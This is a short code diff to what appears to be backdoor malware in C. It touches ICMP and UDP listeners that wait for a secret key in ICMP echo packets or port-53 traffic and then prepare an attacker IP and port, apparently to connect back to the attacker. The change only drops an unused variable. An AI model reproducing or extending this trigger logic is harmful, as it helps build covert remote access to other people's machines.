@@ -48,7 +48,7 @@ void icmp_listener(void){
             		icmp = (struct icmp *)(ip + 1);
             
             		if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, key, ksize) == 0)){
-                		char *k, *attacker_ip, *data = (char *) malloc(ksize+24);
+                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                 		int attacker_port = 0;
 
 				bzero(data, ksize+24);
@@ -93,7 +93,7 @@ void udp_listener(void) {
 			udp = (struct udphdr *)(ip + 1);
 			
 			if((udp->dest == htons(53)) && (strstr(buf, key) == 0)){
-                		char *k, *attacker_ip, *data = (char *) malloc(ksize+24);
+                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                 		int attacker_port = 0;
 
 				bzero(data, ksize+24);
